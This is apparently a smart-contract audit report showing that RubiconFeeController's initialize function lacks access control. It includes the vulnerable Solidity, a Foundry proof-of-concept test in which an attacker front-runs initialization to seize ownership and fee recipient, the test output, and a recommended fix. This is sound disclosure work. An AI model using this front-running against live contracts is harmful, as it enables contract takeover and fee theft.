# Initialize function can be front run by attacker

# Initialize function can be front run by attacker

## Summary

The protocol initializes the contract using the initialize function where this function does not apply access control to prevent malicious actors from front running it. There are two examples of this case, one of which is `RubiconFeeController::initialize`, the purpose of this initialization is to set the owner of the contract and `feeRecipient`.  The affected code :

```solidity
File : gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol

function initialize(
        address _owner,
        address _feeRecipient
    ) external override {
        if (initialized) revert AlreadyInitialized();
        owner = _owner;
        feeRecipient = _feeRecipient;

        initialized = true;
    }
```

Some consequences if this happens: 

1. The attacker becomes the owner of the contract and can also be the `feeRecipient` of the protocol
2. Because now attacker become the owner of contract, he/she can call and set the value of [`setPairBasedFee`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L120-L130), [`setBaseFee`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L132-L136), [`setFeeRecipient`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L138-L140), and [`setGladiusReactor`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L142-L144) functions.
3. If the true owner of the contract want to initialized, it will be revert because it can be only initialized once

## Vulnerability Detail

**POC** 

To prove this attack vector, I used the existing test environment with slight changes to the setup function 

```solidity
function setUp() public {
	feeController = new RubiconFeeController();
}

function test_frontruninitialize() public {
        address Alice = makeAddr("Alice");
        vm.prank(Alice);
	//Alice front running the initialize step, set her own as owner and feeRecipient
        feeController.initialize(Alice,Alice);
        assertEq(feeController.owner(), Alice);
        assertEq(feeController.feeRecipient(), Alice);

        //revert for intialized for a second time
        vm.prank(PROTOCOL_FEE_OWNER);
        vm.expectRevert();
        feeController.initialize(PROTOCOL_FEE_OWNER, RECIPIENT);
    }
```

To execute it, just insert this test into `RubiconFeeController.t.sol` and in the `setUp` function just deploy `RubiconFeeController`. After that execute with :

```solidity
forge test --match-test test_frontruninitialize
```

Result :

```solidity
Running 1 test for test/fee-controllers/RubiconFeeController.t.sol:RubiconFeeControllerTest
[PASS] test_frontruninitialize() (gas: 57986)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 44.58ms
```

## Impact

1. The attacker becomes the owner of the contract and can also be the `feeRecipient` of the protocol
2. Because now attacker become the owner of contract, he/she can call and set the value of [`setPairBasedFee`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L120-L130), [`setBaseFee`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L132-L136), [`setFeeRecipient`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L138-L140), and [`setGladiusReactor`](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/fee-controllers/RubiconFeeController.sol#L142-L144) functions.
3. If the true owner of the contract want to initialized, it will be revert because it can be only initialized once

## Tool used

Manual review

## Recommendation

Add a require statement to each initialize function to verify that the function is called by the contract owner only, and post verification roles should be setup. Otherwise, setting the owner in the contractâ€™s constructor to the `msg.sender` and adding the `onlyOwner` modifier to all initializers would be enough for access control.
